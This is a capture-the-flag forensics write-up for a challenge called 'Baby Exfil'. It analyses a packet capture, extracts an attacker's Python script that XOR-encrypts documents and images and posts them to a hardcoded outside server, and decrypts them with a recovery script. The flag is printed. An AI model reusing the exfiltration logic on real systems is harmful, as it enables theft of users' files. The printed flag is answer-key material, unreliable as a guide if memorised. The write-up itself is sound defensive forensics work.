# 🕵️‍♂️ Baby Exfil - CTF Challenge Writeup

**Challenge**: Baby Exfil  
**Category**: Forensics / Network Analysis  
**Status**: ✅ Solved  
**Flag**: `uoftctf{b4by_w1r3sh4rk_an4lys1s}`

---

## 1. Scenario Overview

Team K&K identified suspicious network activity and suspected a data exfiltration attempt by a competing team. We were provided with a packet capture file (`final.pcapng`) and tasked with analyzing the network logs to uncover the truth and recover any stolen confidential data.

## 2. Investigation & Analysis

### 2.1 Initial Triage
We began by analyzing the `final.pcapng` file using `tshark` and Wireshark. A review of the protocol hierarchy statistics (`tshark -z io,phs`) revealed a mix of traffic:
-   **TCP/TLS**: Significant amount of encrypted traffic (likely background noise).
-   **QUIC**: Encrypted UDP traffic (Google/Youtube services).
-   **HTTP**: A small but distinct amount of unencrypted HTTP traffic.

Given the "exfiltration" context, unencrypted HTTP traffic is a prime suspect for data leakage.

### 2.2 Traffic Inspection
We filtered for HTTP traffic (`http`) and observed the following suspicious activity:
1.  **GET Request**: `GET /JdRlPr1.py` from `10.0.2.15` to `35.238.80.16`. This suggests the attacker downloaded a python script.
2.  **POST Requests**: Multiple `POST /upload` requests from `10.0.2.15` to `34.134.77.90:8080`. These requests contained `multipart/form-data`.

The repeated POST requests to an `/upload` endpoint strongly suggested data exfiltration.

### 2.3 Payload Extraction
We extracted the `JdRlPr1.py` script and the content of the `POST` requests.

#### The Exfiltration Script (`JdRlPr1.py`)
The extracted script revealed the attacker's methodology:
```python
import os
import requests

key = "G0G0Squ1d3Ncrypt10n"
server = "http://34.134.77.90:8080/upload"

def xor_file(data, key):
    result = bytearray()
    for i in range(len(data)):
        result.append(data[i] ^ ord(key[i % len(key)]))
    return bytes(result)

# ... (logic to walk directories and simple XOR encryption)
```
**Key Findings:**
-   **Encryption**: A simple XOR cipher is used.
-   **Key**: `G0G0Squ1d3Ncrypt10n`
-   **Target**: Files ending in `.docx`, `.png`, `.jpeg`, `.jpg`.
-   **Mechanism**: The script reads the file, XORs the content, converts it to **hex strings**, and uploads it.

## 3. Solution Development

To recover the files, we reversed the attacker's logic. Since XOR is symmetric ($A \oplus B = C \implies C \oplus B = A$), we can decrypt the data using the same key.

### 3.1 Decryption Script
We developed the following Python script to parse the captured exfiltration payloads (saved as `upload`, `upload(1)`, etc.) and decrypt them:

```python
import os
import re

key = "G0G0Squ1d3Ncrypt10n"

def xor_decrypt(data_hex, key):
    # Convert hex string back to bytes
    data = bytes.fromhex(data_hex.strip())
    result = bytearray()
    # Apply XOR with the key
    for i in range(len(data)):
        result.append(data[i] ^ ord(key[i % len(key)]))
    return bytes(result)

# ... (Parsing logic to extract filename and hex content from multipart body)
```

## 4. Results & Flag Recovery

Running the decryption script on the extracted packets yielded 5 image files. We inspected each one.

### Recovered Evidence

**File**: `HNderw.png`  
This image contained the flag explicitly written in the visual content.

![Flag Image](extracted_files/decrypted/HNderw.png)

(Other recovered images were standard memes or irrelevant photos)

## 5. Conclusion

-   **Attacker Method**: Used a custom Python script (`JdRlPr1.py`) to XOR-encrypt and exfiltrate desktop files via HTTP POST.
-   **Detection**: Network analysis identified the anomalous HTTP upload traffic.
-   **Recovery**: We reversed the XOR encryption using the hardcoded key found in the dropped script.
-   **Flag**: `uoftctf{b4by_w1r3sh4rk_an4lys1s}`

---
